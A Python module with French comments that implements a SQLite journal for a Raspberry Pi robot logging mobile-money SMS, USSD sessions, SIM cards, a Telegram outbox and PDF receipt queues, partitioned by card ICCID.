# -*- coding: utf-8 -*-
"""Journal du robot : SMS reçus, transcriptions USSD, événements.

SQLite : un seul fichier, robuste, consultable plus tard par l'app web.
Chaque ligne porte le compte (opérateur) d'origine.
Les montants MoMo sont extraits des SMS pour les rapports quotidiens.

Deux files d'attente distinctes y vivent aussi, et ne visent pas la même
destination : la colonne « envoye » suit ce qui reste à pousser vers le cloud,
la table « sortants » ce qui reste à annoncer dans Telegram après une coupure.

Cloisonnement par carte
-----------------------
Chaque ligne porte aussi l'**ICCID** de la SIM qui l'a produite, et la table
`cartes` garde la trace de toutes les puces déjà vues. Deux SIM MTN qui se
succèdent dans le berceau sont deux comptes : leurs encaissements ne doivent
pas s'additionner, et retirer une carte ne doit pas faire disparaître son
journal — il ressort intact quand on la remet.

Les lignes antérieures au cloisonnement n'ont pas d'ICCID. On ne peut pas
deviner à quelle carte elles appartiennent, alors on les montre toujours,
quelle que soit la carte consultée : les cacher ressemblerait à une perte de
données. Le mélange s'efface de lui-même, puisque toute ligne nouvelle est
attribuée.
"""

import csv
import io
import os
import re
import sqlite3
import threading
from datetime import datetime, timedelta

from .analyse_sms import analyser
from .textes import t


def _canal(brut):
    """Le canal est stocké en texte : « alertes », ou un identifiant de chat."""
    if not brut:
        return None
    return int(brut) if re.fullmatch(r"-?\d+", brut) else brut


def _conseil(chemin, erreur):
    """Message d'erreur qui dit quel fichier, pourquoi, et quoi taper.

    « attempt to write a readonly database » ne dit rien d'utile à qui n'a
    pas écrit SQLite. Ici on nomme le fichier, l'utilisateur, et les deux
    sorties possibles."""
    import getpass
    import os

    try:
        utilisateur = getpass.getuser()
    except Exception:
        utilisateur = str(os.getuid())
    dossier = os.path.dirname(chemin) or "."
    return t(
        f"The log “{chemin}” is not writable for user “{utilisateur}”.\n"
        f"({erreur})\n\n"
        "The service runs as root and writes without trouble; a manual "
        "launch from your account runs into the file's permissions.\n\n"
        "Two ways out:\n"
        f"  sudo chown -R {utilisateur} {dossier}     "
        "← once and for all, recommended\n"
        "  sudo python3 -m totem …                    "
        "← run with the service's rights\n\n"
        "The diagnostics do not need the log and work without any special "
        "rights:\n"
        "  python3 -m totem --modems\n"
        "  python3 -m totem --stk",

        f"Le journal « {chemin} » n'est pas accessible en écriture pour "
        f"l'utilisateur « {utilisateur} ».\n"
        f"({erreur})\n\n"
        "Le service tourne en root et écrit sans difficulté ; un lancement "
        "à la main depuis votre compte se heurte aux droits du fichier.\n\n"
        "Deux solutions :\n"
        f"  sudo chown -R {utilisateur} {dossier}     "
        "← une fois pour toutes, recommandé\n"
        "  sudo python3 -m totem …                    "
        "← lancer avec les droits du service\n\n"
        "Les diagnostics n'ont pas besoin du journal et fonctionnent sans "
        "droits particuliers :\n"
        "  python3 -m totem --modems\n"
        "  python3 -m totem --stk"
    )


class JournalInaccessible(Exception):
    """Le journal existe mais l'utilisateur courant ne peut pas y écrire.

    Cas typique : le service tourne en root et a créé le fichier ; un
    lancement manuel depuis un compte ordinaire se heurte alors aux droits.
    L'erreur brute de SQLite (« attempt to write a readonly database ») ne
    dit ni quel fichier, ni quoi faire."""


def refermer(chemin):
    """Ne laisser lire ce fichier qu'à son propriétaire (0600).

    POURQUOI IL FAUT LE FAIRE À LA MAIN. SQLite crée ses fichiers selon le
    « umask » du processus, qui vaut 022 sur un Raspberry Pi : le journal
    naissait donc en 0644. Or ce fichier porte TOUT — les montants, les
    tiers, les numéros de téléphone, les soldes. Un Pi n'est pas une machine
    à un seul utilisateur : il a un compte « pi », souvent un accès SSH
    partagé pour la maintenance, parfois un second compte pour quelqu'un du
    bureau. En 0644, tous lisaient la caisse.

    On ne touche pas au propriétaire du fichier — `install.sh` le donne au
    compte qui a lancé l'installation, pour qu'un diagnostic à la main reste
    possible. On ferme seulement aux AUTRES.

    Un échec n'empêche pas de travailler : sur une partition FAT (une clé
    USB, la partition de démarrage), `chmod` n'a aucun effet et lève parfois.
    Le journal doit s'ouvrir quand même — mais voir `config.avertissements_droits`,
    qui le dit alors à voix haute.
    """
    try:
        os.chmod(chemin, 0o600)
    except OSError:
        pass


class Journal:
    def __init__(self, chemin="totem.db"):
        try:
            self.conn = sqlite3.connect(chemin, check_same_thread=False)
        except sqlite3.OperationalError as e:
            raise JournalInaccessible(_conseil(chemin, e))
        # Aussitôt ouvert, aussitôt refermé aux autres.
        refermer(chemin)
        self.verrou = threading.Lock()
        try:
            self._creer_tables()
        except sqlite3.OperationalError as e:
            raise JournalInaccessible(_conseil(chemin, e))

    def _creer_tables(self):
        with self.verrou:
            self.conn.executescript(
                """
                CREATE TABLE IF NOT EXISTS sms(
                    id INTEGER PRIMARY KEY, date TEXT, expediteur TEXT,
                    texte TEXT, compte TEXT);
                CREATE TABLE IF NOT EXISTS ussd(
                    id INTEGER PRIMARY KEY, date TEXT, direction TEXT,
                    texte TEXT, compte TEXT);
                -- Courrier en souffrance : ce que le robot n'a pas pu envoyer
                -- dans Telegram (coupure Internet). Rien ne se perd, tout part
                -- au retour du réseau. À ne pas confondre avec la file vers le
                -- cloud (colonne « envoye »), qui vise une autre destination.
                CREATE TABLE IF NOT EXISTS sortants(
                    id INTEGER PRIMARY KEY, date TEXT, canal TEXT, texte TEXT,
                    essais INTEGER DEFAULT 0);
                CREATE TABLE IF NOT EXISTS evenements(
                    id INTEGER PRIMARY KEY, date TEXT, texte TEXT);
                -- La mémoire du robot entre deux démarrages : de petites
                -- valeurs nommées (l'empreinte du lecteur de SMS…). Rien
                -- d'important n'y vit : la perdre ne perd aucune donnée.
                CREATE TABLE IF NOT EXISTS memos(
                    cle TEXT PRIMARY KEY, valeur TEXT);
                -- Toutes les cartes SIM déjà vues dans ce terminal. L'ICCID
                -- est gravé sur la puce : c'est la seule identité qui survit
                -- au retrait, au changement de modem et à l'itinérance.
                CREATE TABLE IF NOT EXISTS cartes(
                    iccid TEXT PRIMARY KEY, imsi TEXT, operateur TEXT,
                    libelle TEXT, numero TEXT, imei TEXT,
                    premiere_vue TEXT, derniere_vue TEXT,
                    envoye INTEGER DEFAULT 0);
                -- Raccourcis appris en observant une opération réelle.
                -- Rangés par OPÉRATEUR et non par carte : les codes sont ceux
                -- du réseau, pas de la puce. Changer de SIM MTN pour une autre
                -- SIM MTN ne doit pas faire disparaître les boutons.
                CREATE TABLE IF NOT EXISTS raccourcis(
                    id INTEGER PRIMARY KEY, operateur TEXT NOT NULL,
                    nom TEXT NOT NULL, libelle TEXT, etapes TEXT NOT NULL,
                    cree_le TEXT, UNIQUE(operateur, nom));
                -- Reçus à fabriquer, puis à envoyer. Le PDF lui-même n'est
                -- jamais écrit ici : il se refabrique à l'identique à partir
                -- du SMS, qui est juste à côté. Ce qui compte, c'est de ne
                -- l'envoyer qu'UNE fois.
                --
                -- Deux verrous contre le doublon : le SMS d'origine, unique
                -- par construction, et la référence de transaction, qui
                -- survit à un redémarrage du modem — c'est elle qui rattrape
                -- le même message relu dans un autre emplacement.
                CREATE TABLE IF NOT EXISTS recus(
                    id INTEGER PRIMARY KEY,
                    -- D'où vient le document : « sms » pour un encaissement,
                    -- « ussd » pour un solde consulté au menu. Un solde ne
                    -- passe pas toujours par un SMS — le plus souvent
                    -- l'opérateur le dit à l'écran, et nulle part ailleurs.
                    source TEXT NOT NULL DEFAULT 'sms',
                    source_id INTEGER NOT NULL,
                    genre TEXT NOT NULL,
                    numero TEXT NOT NULL,
                    reference TEXT,
                    date TEXT,
                    envoye INTEGER DEFAULT 0,
                    archive INTEGER DEFAULT 0,
                    essais INTEGER DEFAULT 0,
                    UNIQUE(source, source_id));
                CREATE UNIQUE INDEX IF NOT EXISTS recus_reference
                    ON recus(reference) WHERE reference IS NOT NULL;
                """
            )
            # Migration douce des bases créées avant le multi-comptes.
            self._ajouter_colonne_si_absente("sms", "compte")
            self._ajouter_colonne_si_absente("ussd", "compte")
            # Cloisonnement par carte : les lignes déjà présentes restent sans
            # ICCID, et sont donc visibles depuis n'importe quelle carte.
            self._ajouter_colonne_si_absente("sms", "iccid")
            self._ajouter_colonne_si_absente("ussd", "iccid")
            # File d'attente vers le cloud : 0 tant que la ligne n'est pas
            # partie. Les lignes déjà présentes sont considérées à envoyer.
            self._ajouter_colonne_si_absente("sms", "envoye", "INTEGER DEFAULT 0")
            self._ajouter_colonne_si_absente("evenements", "envoye", "INTEGER DEFAULT 0")
            # L'identité déclarée à la main : le numéro de la puce et le nom
            # sous lequel elle encaisse. La SIM ne les dit presque jamais, et
            # sans eux un reçu ne sait pas de quel côté d'un transfert on est.
            self._ajouter_colonne_si_absente("cartes", "nom")
            # L'heure RÉSEAU du SMS (TP-SCTS), à côté de l'heure de relève :
            # après une coupure, les deux divergent, et c'est elle qui fait foi.
            self._ajouter_colonne_si_absente("sms", "emis_le")
            self._reprendre_recus()
            # La nature choisie par le propriétaire pour un reçu demandé
            # depuis la plateforme (depot/retrait/transfert/solde) : elle
            # habille le titre du document, jamais les données stockées.
            # Après _reprendre_recus : la reconstruction repartirait sans elle.
            self._ajouter_colonne_si_absente("recus", "nature")
            # La langue du demandeur, quand le reçu vient de la plateforme :
            # la fabrication est différée d'une dizaine de secondes, et sans
            # cette colonne un écran en français recevait un PDF dans la
            # langue du robot. Vide : la langue du robot, comme avant.
            self._ajouter_colonne_si_absente("recus", "langue")
            self.conn.commit()

    def _reprendre_recus(self):
        """Les premiers reçus ne connaissaient que les SMS.

        La table portait une colonne « sms_id », et son unicité empêchait
        d'inscrire un solde relevé au menu USSD — qui n'a pas de SMS derrière
        lui. On rebâtit la table sous sa forme actuelle, en gardant ce qu'elle
        contient : sans ça, des reçus déjà envoyés repartiraient une seconde
        fois.
        """
        colonnes = {r[1] for r in self.conn.execute("PRAGMA table_info(recus)")}
        if not colonnes or "source" in colonnes:
            return
        self.conn.executescript("""
            ALTER TABLE recus RENAME TO recus_avant;
            CREATE TABLE recus(
                id INTEGER PRIMARY KEY,
                source TEXT NOT NULL DEFAULT 'sms',
                source_id INTEGER NOT NULL,
                genre TEXT NOT NULL,
                numero TEXT NOT NULL,
                reference TEXT,
                date TEXT,
                envoye INTEGER DEFAULT 0,
                archive INTEGER DEFAULT 0,
                essais INTEGER DEFAULT 0,
                UNIQUE(source, source_id));
            INSERT INTO recus(id, source, source_id, genre, numero, reference,
                              date, envoye, archive, essais)
                SELECT id, 'sms', sms_id, genre, numero, reference,
                       date, envoye, archive, essais FROM recus_avant;
            DROP TABLE recus_avant;
            CREATE UNIQUE INDEX IF NOT EXISTS recus_reference
                ON recus(reference) WHERE reference IS NOT NULL;
        """)

    def _ajouter_colonne_si_absente(self, table, colonne, type_sql="TEXT"):
        existantes = {r[1] for r in self.conn.execute(f"PRAGMA table_info({table})")}
        if colonne not in existantes:
            self.conn.execute(
                f"ALTER TABLE {table} ADD COLUMN {colonne} {type_sql}")

    def _maintenant(self):
        return datetime.now().isoformat(timespec="seconds")

    def sms(self, expediteur, texte, compte="", iccid="", emis_le=None):
        """Renvoie l'identifiant de la ligne écrite : c'est lui qui rattache
        un éventuel reçu à son message d'origine.

        `date` reste l'heure de RELÈVE (heure du Pi) — c'est elle qui borne le
        garde-fou anti-doublon. `emis_le` est l'heure RÉSEAU du SMS (TP-SCTS),
        conservée à part : c'est l'heure vraie de l'opération, celle qui fera
        foi pour l'ordre et les reçus."""
        with self.verrou:
            curseur = self.conn.execute(
                "INSERT INTO sms(date, expediteur, texte, compte, iccid, emis_le) "
                "VALUES(?,?,?,?,?,?)",
                (self._maintenant(), expediteur, texte, compte, iccid, emis_le))
            self.conn.commit()
            return curseur.lastrowid

    def ussd(self, direction, texte, compte="", iccid=""):
        """direction : « envoyé » ou « reçu ». Ne JAMAIS journaliser un PIN :
        l'appelant remplace le PIN par des étoiles avant l'appel.

        Renvoie l'identifiant de la ligne : un solde lu à l'écran peut donner
        lieu à un reçu, et c'est par lui qu'on le rattache."""
        with self.verrou:
            curseur = self.conn.execute(
                "INSERT INTO ussd(date, direction, texte, compte, iccid) "
                "VALUES(?,?,?,?,?)",
                (self._maintenant(), direction, texte, compte, iccid))
            self.conn.commit()
            return curseur.lastrowid

    def evenement(self, texte):
        with self.verrou:
            self.conn.execute("INSERT INTO evenements(date, texte) VALUES(?,?)",
                              (self._maintenant(), texte))
            self.conn.commit()

    def sms_existe(self, expediteur, texte, compte="", secondes=900):
        """Ce SMS a-t-il déjà été enregistré récemment ? Garde-fou contre les
        doublons quand l'effacement dans le modem a échoué au tour précédent."""
        depuis = (datetime.now() - timedelta(seconds=secondes)).isoformat(
            timespec="seconds")
        with self.verrou:
            return self.conn.execute(
                "SELECT 1 FROM sms WHERE date >= ? AND expediteur = ? AND texte = ? "
                "AND COALESCE(compte, '') = ? LIMIT 1",
                (depuis, expediteur, texte, compte)).fetchone() is not None

    # ---- cartes SIM connues ------------------------------------------------
    def voir_carte(self, carte, imei=""):
        """Enregistre la carte présente et dit si on la découvre.

        Renvoie « nouvelle » la toute première fois que cette puce est vue,
        « connue » si elle figure déjà au registre, « inconnue » si l'ICCID
        n'a pas pu être lu. Le robot n'annonce pas la même chose dans les deux
        premiers cas : découvrir une puce jamais vue mérite un avertissement,
        retrouver l'une des siennes mérite une confirmation rassurante.
        """
        if not carte or not carte.iccid:
            return "inconnue"
        maintenant = self._maintenant()
        with self.verrou:
            ligne = self.conn.execute(
                "SELECT derniere_vue FROM cartes WHERE iccid = ?",
                (carte.iccid,)).fetchone()
            if ligne is None:
                self.conn.execute(
                    "INSERT INTO cartes(iccid, imsi, operateur, libelle, numero,"
                    " imei, premiere_vue, derniere_vue, envoye)"
                    " VALUES(?,?,?,?,?,?,?,?,0)",
                    (carte.iccid, carte.imsi, carte.operateur, carte.libelle,
                     carte.numero, imei, maintenant, maintenant))
                etat = "nouvelle"
            else:
                # Le libellé et l'IMSI peuvent s'affiner (IMSI lu plus tard),
                # on les rafraîchit. Mais le NUMÉRO ne se touche que s'il
                # arrive une vraie valeur : la puce ne le déclare presque
                # jamais (AT+CNUM vide), alors que le propriétaire, lui, l'a
                # saisi à la main. Un « rafraîchissement » avec du vide
                # l'effacerait toutes les minutes — et c'est la donnée qui dit
                # de quel côté d'un transfert on se trouve.
                self.conn.execute(
                    "UPDATE cartes SET imsi = ?, operateur = ?, libelle = ?,"
                    " numero = COALESCE(NULLIF(?, ''), numero),"
                    " imei = ?, derniere_vue = ?, envoye = 0"
                    " WHERE iccid = ?",
                    (carte.imsi, carte.operateur, carte.libelle, carte.numero,
                     imei, maintenant, carte.iccid))
                etat = "connue"
            self.conn.commit()
        return etat

    def cartes(self):
        """Toutes les cartes vues, la plus récemment présente en tête.

        [(iccid, libelle, operateur, numero, premiere_vue, derniere_vue,
          nb_sms, total_recu)]
        """
        with self.verrou:
            lignes = self.conn.execute(
                "SELECT iccid, libelle, operateur, COALESCE(numero, ''),"
                " premiere_vue, derniere_vue FROM cartes"
                " ORDER BY derniere_vue DESC").fetchall()
            textes = {}
            for iccid, texte in self.conn.execute(
                    "SELECT COALESCE(iccid, ''), texte FROM sms"):
                textes.setdefault(iccid, []).append(texte)
        # Nos numéros tranchent le sens d'un transfert à deux parties : sans
        # eux, un encaissement d'agent (« Transfer from X to NOUS ») resterait
        # invisible dans le total par carte, alors que le bilan du jour, lui,
        # le compte. Les deux vues doivent dire le même chiffre.
        nums = tuple(self.numeros_declares())
        resultat = []
        for iccid, libelle, operateur, numero, premiere, derniere in lignes:
            nb, total = 0, 0
            for texte in textes.get(iccid, []):
                montant = montant_recu(texte, numeros=nums)
                if montant is not None:
                    nb += 1
                    total += montant
            resultat.append((iccid, libelle, operateur, numero, premiere,
                             derniere, len(textes.get(iccid, [])), total))
        return resultat

    # ---- l'identité déclarée d'une carte -----------------------------------
    # Le numéro et le nom ne se lisent pas sur la puce : c'est le propriétaire
    # qui les connaît. Ils s'inscrivent depuis Telegram, une fois, et suivent
    # ensuite la carte partout — y compris si elle change de modem.

    def definir_identite(self, iccid, numero=None, nom=None):
        """Inscrit le numéro et/ou le nom d'une carte. Renvoie False si la
        carte n'est pas au registre — on n'invente pas une puce jamais vue."""
        if not iccid:
            return False
        with self.verrou:
            if not self.conn.execute("SELECT 1 FROM cartes WHERE iccid = ?",
                                     (iccid,)).fetchone():
                return False
            if numero is not None:
                self.conn.execute("UPDATE cartes SET numero = ? WHERE iccid = ?",
                                  (numero, iccid))
            if nom is not None:
                self.conn.execute("UPDATE cartes SET nom = ? WHERE iccid = ?",
                                  (nom, iccid))
            # La ligne repart vers le cloud : l'application web doit voir le
            # changement sans attendre qu'il se passe autre chose.
            self.conn.execute("UPDATE cartes SET envoye = 0 WHERE iccid = ?",
                              (iccid,))
            self.conn.commit()
        return True

    def identite(self, iccid):
        """(numéro, nom) d'une carte, chacun vide s'il n'a pas été déclaré."""
        if not iccid:
            return "", ""
        with self.verrou:
            ligne = self.conn.execute(
                "SELECT COALESCE(numero, ''), COALESCE(nom, '') "
                "FROM cartes WHERE iccid = ?", (iccid,)).fetchone()
        return tuple(ligne) if ligne else ("", "")

    def numeros_declares(self):
        """Tous les numéros inscrits, quelle que soit la carte. C'est avec eux
        qu'on décide de quel côté d'un transfert se trouve le terminal."""
        with self.verrou:
            return [n for (n,) in self.conn.execute(
                "SELECT numero FROM cartes WHERE numero IS NOT NULL "
                "AND numero <> ''")]

    def cartes_non_envoyees(self, limite=100):
        with self.verrou:
            return self.conn.execute(
                "SELECT iccid, imsi, operateur, libelle, COALESCE(numero, ''),"
                " COALESCE(imei, ''), premiere_vue, derniere_vue FROM cartes"
                " WHERE COALESCE(envoye, 0) = 0 ORDER BY derniere_vue LIMIT ?",
                (limite,)).fetchall()

    def marquer_cartes_envoyees(self, iccids):
        if not iccids:
            return
        with self.verrou:
            self.conn.executemany(
                "UPDATE cartes SET envoye = 1 WHERE iccid = ?",
                [(i,) for i in iccids])
            self.conn.commit()

    @staticmethod
    def _filtre_cartes(iccids):
        """Clause SQL et paramètres pour ne voir que certaines cartes.

        On filtre sur les cartes **présentes**, pas sur celle du compte piloté :
        avec deux modems, ne montrer que l'un ferait disparaître les recettes de
        l'autre du bilan quotidien. Ce qu'on écarte, ce sont les cartes retirées
        — dont l'historique reste consultable par `/sims`.

        Les lignes sans ICCID (antérieures au cloisonnement) restent visibles :
        on ignore à qui elles appartiennent, et les masquer donnerait
        l'impression d'un historique amputé.
        """
        retenus = [i for i in ([iccids] if isinstance(iccids, str) else iccids or []) if i]
        if not retenus:
            return "", ()
        trous = ",".join("?" * len(retenus))
        return f" AND (iccid IN ({trous}) OR COALESCE(iccid, '') = '')", tuple(retenus)

    # ---- raccourcis appris -------------------------------------------------
    # Les codes USSD n'ont rien d'universel : le solde est « *126# puis 5
    # puis 1 » chez l'un, « #148*5# » chez l'autre. Les deviner serait
    # irresponsable — une erreur de chiffre envoie de l'argent ailleurs. On
    # les apprend donc en regardant l'utilisateur faire l'opération une fois.

    def ajouter_raccourci(self, operateur, nom, libelle, etapes):
        """Enregistre (ou remplace) un raccourci pour cet opérateur."""
        if not operateur or not nom or not etapes:
            return False
        with self.verrou:
            self.conn.execute(
                "INSERT INTO raccourcis(operateur, nom, libelle, etapes, cree_le)"
                " VALUES(?,?,?,?,?)"
                " ON CONFLICT(operateur, nom) DO UPDATE SET"
                " libelle = excluded.libelle, etapes = excluded.etapes,"
                " cree_le = excluded.cree_le",
                (operateur, nom[:24], (libelle or nom)[:32],
                 ",".join(etapes), self._maintenant()))
            self.conn.commit()
        return True

    def raccourcis(self, operateur):
        """{nom: {libelle, etapes}} pour l'opérateur de la carte en place."""
        if not operateur:
            return {}
        with self.verrou:
            lignes = self.conn.execute(
                "SELECT nom, libelle, etapes FROM raccourcis"
                " WHERE operateur = ? ORDER BY id", (operateur,)).fetchall()
        return {nom: {"libelle": libelle or nom,
                      "etapes": [e for e in etapes.split(",") if e]}
                for nom, libelle, etapes in lignes}

    def tous_raccourcis(self):
        """[(operateur, nom, libelle, etapes), …] — le carnet entier, tel quel.

        C'est le pont cloud qui le demande : la plateforme doit connaître les
        boutons de TOUS les opérateurs, pas seulement celui de la carte
        pilotée. `etapes` reste la chaîne rangée en base (« *126#,5,1 »)."""
        with self.verrou:
            return self.conn.execute(
                "SELECT operateur, nom, libelle, etapes FROM raccourcis"
                " ORDER BY id").fetchall()

    def supprimer_raccourci(self, operateur, nom):
        with self.verrou:
            curseur = self.conn.execute(
                "DELETE FROM raccourcis WHERE operateur = ? AND nom = ?",
                (operateur, nom))
            self.conn.commit()
        return curseur.rowcount > 0

    # ---- courrier Telegram en souffrance -----------------------------------
    def enfiler(self, canal, texte):
        """Met un message de côté pour l'envoyer dès que le réseau revient."""
        with self.verrou:
            self.conn.execute(
                "INSERT INTO sortants(date, canal, texte) VALUES(?,?,?)",
                (self._maintenant(), "" if canal is None else str(canal), texte))
            self.conn.commit()

    def courrier_en_attente(self):
        with self.verrou:
            return self.conn.execute("SELECT COUNT(*) FROM sortants").fetchone()[0]

    def prochain_courrier(self):
        """(id, canal, texte, essais) du plus ancien message en attente."""
        with self.verrou:
            ligne = self.conn.execute(
                "SELECT id, canal, texte, essais FROM sortants "
                "ORDER BY id LIMIT 1").fetchone()
        if not ligne:
            return None
        identifiant, canal, texte, essais = ligne
        return identifiant, _canal(canal), texte, essais

    def courrier_livre(self, identifiant):
        with self.verrou:
            self.conn.execute("DELETE FROM sortants WHERE id = ?", (identifiant,))
            self.conn.commit()

    def courrier_echoue(self, identifiant, essais_max=60):
        """Compte l'échec ; abandonne au bout de `essais_max` tentatives pour
        qu'un message impossible à envoyer ne bloque pas toute la file.

        Renvoie True si le message vient d'être abandonné, pour que l'appelant
        puisse le signaler au lieu de le perdre en silence."""
        with self.verrou:
            self.conn.execute(
                "UPDATE sortants SET essais = essais + 1 WHERE id = ?", (identifiant,))
            curseur = self.conn.execute(
                "DELETE FROM sortants WHERE id = ? AND essais >= ?",
                (identifiant, essais_max))
            self.conn.commit()
            return curseur.rowcount > 0

    # ---- reçus PDF ---------------------------------------------------------
    # Le document n'est pas conservé : il se refabrique à l'identique depuis le
    # SMS, qui lui reste au journal. Ce qu'on garde ici, c'est la promesse de
    # l'envoyer, et la certitude de ne pas l'envoyer deux fois.

    def texte_sms(self, identifiant):
        """Le texte d'un SMS du journal, ou None. Sert au guichet à distance :
        établir après coup le reçu d'un message passé exige de le relire."""
        try:
            with self.verrou:
                ligne = self.conn.execute(
                    "SELECT texte FROM sms WHERE id = ?",
                    (int(identifiant),)).fetchone()
            return ligne[0] if ligne else None
        except Exception:
            return None

    def programmer_recu(self, source_id, genre, numero, reference=None,
                        source="sms", nature=None, langue=None):
        """Inscrit un reçu à fabriquer. Renvoie le numéro EN VIGUEUR pour ce
        message (celui inscrit, qui peut différer du numéro proposé si le
        document existait déjà), ou None si rien ne le désigne.

        `source` : « sms » pour un encaissement, « ussd » pour un solde lu au
        menu. Le même SMS relu après un redémarrage du modem tombe sur l'un des
        deux verrous d'unicité et ne produit pas de second document.

        `nature` : le choix du propriétaire, quand la demande vient de la
        plateforme. Redemander le reçu d'un message avec une AUTRE nature
        refabrique le document — même numéro, nouveau genre — au lieu de
        resservir l'ancien.
        """
        try:
            with self.verrou:
                self.conn.execute(
                    "INSERT INTO recus(source, source_id, genre, numero, "
                    "reference, date, nature, langue) VALUES(?,?,?,?,?,?,?,?)",
                    (source, source_id, genre, numero, reference or None,
                     self._maintenant(), nature or None, langue or None))
                self.conn.commit()
            return numero
        except sqlite3.IntegrityError:
            with self.verrou:
                quand = self._maintenant()
                existante = self.conn.execute(
                    "SELECT genre, nature FROM recus "
                    "WHERE source = ? AND source_id = ?",
                    (source, source_id)).fetchone()
                if existante is not None:
                    genre_avant, nature_avant = existante
                    # Le document CHANGE (autre genre, ou autre nature — donc
                    # un autre titre) : il repart entier, Telegram compris.
                    # Sinon, « régénérer » refait le document en silence :
                    # seule l'archive repart — la lecture du robot a pu
                    # s'améliorer — et Telegram n'est pas re-spammé. Une
                    # redemande sans nature n'efface jamais un choix posé.
                    change = (genre_avant != genre
                              or (nature is not None and nature != nature_avant))
                    if change:
                        # La référence suit le nouveau document (un solde
                        # n'en a pas, un transfert si) — sauf si un AUTRE
                        # document la tient déjà. La date avance : c'est elle
                        # qui dira, jusqu'au cloud, que le document est refait.
                        try:
                            self.conn.execute(
                                "UPDATE recus SET genre = ?, "
                                "nature = COALESCE(?, nature), "
                                "langue = COALESCE(?, langue), reference = ?, "
                                "date = ?, envoye = 0, archive = 0, essais = 0 "
                                "WHERE source = ? AND source_id = ?",
                                (genre, nature or None, langue or None,
                                 reference or None, quand, source, source_id))
                        except sqlite3.IntegrityError:
                            self.conn.execute(
                                "UPDATE recus SET genre = ?, "
                                "nature = COALESCE(?, nature), "
                                "langue = COALESCE(?, langue), date = ?, "
                                "envoye = 0, archive = 0, essais = 0 "
                                "WHERE source = ? AND source_id = ?",
                                (genre, nature or None, langue or None,
                                 quand, source, source_id))
                    else:
                        self.conn.execute(
                            "UPDATE recus SET archive = 0, essais = 0, "
                            "langue = COALESCE(?, langue), "
                            "date = ? WHERE source = ? AND source_id = ?",
                            (langue or None, quand, source, source_id))
                self.conn.commit()
                # Le numéro EN VIGUEUR : celui de la ligne de ce message —
                # jamais celui recalculé du jour, qui peut différer si le
                # reçu se redemande un autre jour. À défaut, celui du
                # document jumeau qui tient déjà cette référence.
                ligne = self.conn.execute(
                    "SELECT numero FROM recus "
                    "WHERE source = ? AND source_id = ?",
                    (source, source_id)).fetchone()
                if ligne is None and reference:
                    ligne = self.conn.execute(
                        "SELECT numero FROM recus WHERE reference = ?",
                        (reference,)).fetchone()
            return ligne[0] if ligne else None

    def recus_a_relire(self):
        """[(id, source_id, genre, numero, nature)] de tous les reçus nés
        d'un SMS. Le contenu d'un document suit la lecture du robot ; la
        nature posée à la main, elle, ne se discute pas — elle voyage ici
        pour que l'appelant la respecte."""
        with self.verrou:
            return self.conn.execute(
                "SELECT id, source_id, genre, numero, nature FROM recus "
                "WHERE source = 'sms'").fetchall()

    def rearchiver_recu(self, identifiant):
        """Marque un reçu à ré-archiver : même numéro, contenu refait.
        Telegram n'est pas concerné — seul le document du cloud se refait."""
        with self.verrou:
            self.conn.execute(
                "UPDATE recus SET archive = 0, essais = 0 WHERE id = ?",
                (identifiant,))
            self.conn.commit()

    def corriger_genre_recu(self, identifiant, genre, reference=None):
        """Corrige le genre d'un reçu et le remet à archiver.

        Le document déjà parti sur Telegram y reste — on ne re-spamme pas la
        conversation — mais l'archive du cloud, celle que sert la plateforme,
        sera refaite sous le même numéro avec le bon contenu.
        """
        with self.verrou:
            try:
                self.conn.execute(
                    "UPDATE recus SET genre = ?, reference = ?, "
                    "archive = 0, essais = 0 WHERE id = ?",
                    (genre, reference or None, identifiant))
            except sqlite3.IntegrityError:
                # La référence est déjà tenue par un autre document : on
                # corrige le genre sans elle.
                self.conn.execute(
                    "UPDATE recus SET genre = ?, archive = 0, essais = 0 "
                    "WHERE id = ?", (genre, identifiant))
            self.conn.commit()

    def recus_a_envoyer(self, apres_secondes=0, limite=5):
        """Les reçus mûrs, du plus ancien au plus récent.

        `apres_secondes` laisse au message texte le temps de partir en premier :
        l'alerte doit arriver tout de suite, le document quelques secondes
        après. [(id, genre, numero, date, texte, compte, iccid, nature, langue)]
        """
        avant = (datetime.now() - timedelta(seconds=apres_secondes)).isoformat(
            timespec="seconds")
        with self.verrou:
            return self.conn.execute(
                "SELECT r.id, r.genre, r.numero, r.date, "
                "       COALESCE(s.texte, u.texte, ''), "
                "       COALESCE(s.compte, u.compte, ''), "
                "       COALESCE(s.iccid, u.iccid, ''), r.nature, r.langue "
                "FROM recus r "
                "LEFT JOIN sms  s ON r.source = 'sms'  AND s.id = r.source_id "
                "LEFT JOIN ussd u ON r.source = 'ussd' AND u.id = r.source_id "
                "WHERE r.envoye = 0 AND r.date <= ? ORDER BY r.id LIMIT ?",
                (avant, limite)).fetchall()

    def recus_a_archiver(self, limite=5):
        """Les reçus partis sur Telegram mais pas encore déposés dans le cloud.

        Les plus récemment DEMANDÉS d'abord. Le cas vécu : une mise à jour du
        lecteur remet 143 vieux reçus à archiver, et le propriétaire, au même
        moment, redemande LE document qu'il attend — inscrit en dernier, il
        patientait derrière toute la file d'entretien, quatre minutes durant
        lesquelles la plateforme servait encore l'ancien PDF. Un document
        qu'une personne attend passe avant le ménage ; le ménage se fait
        quand même, juste après. `date` avance à chaque redemande — c'est
        elle qui porte l'urgence, pas l'ordre d'inscription.
        """
        with self.verrou:
            return self.conn.execute(
                "SELECT r.id, r.genre, r.numero, r.date, "
                "       COALESCE(s.texte, u.texte, ''), "
                "       COALESCE(s.compte, u.compte, ''), "
                "       COALESCE(s.iccid, u.iccid, ''), r.nature, r.langue "
                "FROM recus r "
                "LEFT JOIN sms  s ON r.source = 'sms'  AND s.id = r.source_id "
                "LEFT JOIN ussd u ON r.source = 'ussd' AND u.id = r.source_id "
                "WHERE r.envoye = 1 AND r.archive = 0 "
                "ORDER BY r.date DESC, r.id DESC LIMIT ?",
                (limite,)).fetchall()

    def recu_envoye(self, identifiant):
        with self.verrou:
            self.conn.execute("UPDATE recus SET envoye = 1, essais = 0 "
                              "WHERE id = ?", (identifiant,))
            self.conn.commit()

    def recu_archive(self, identifiant):
        with self.verrou:
            self.conn.execute("UPDATE recus SET archive = 1 WHERE id = ?",
                              (identifiant,))
            self.conn.commit()

    def recu_echoue(self, identifiant, essais_max=60):
        """Compte l'échec, et renonce au bout d'un long moment : un document
        qu'on n'arrive jamais à fabriquer ne doit pas bloquer les suivants."""
        with self.verrou:
            self.conn.execute("UPDATE recus SET essais = essais + 1 "
                              "WHERE id = ?", (identifiant,))
            self.conn.execute("UPDATE recus SET envoye = 1, archive = 1 "
                              "WHERE id = ? AND essais >= ?",
                              (identifiant, essais_max))
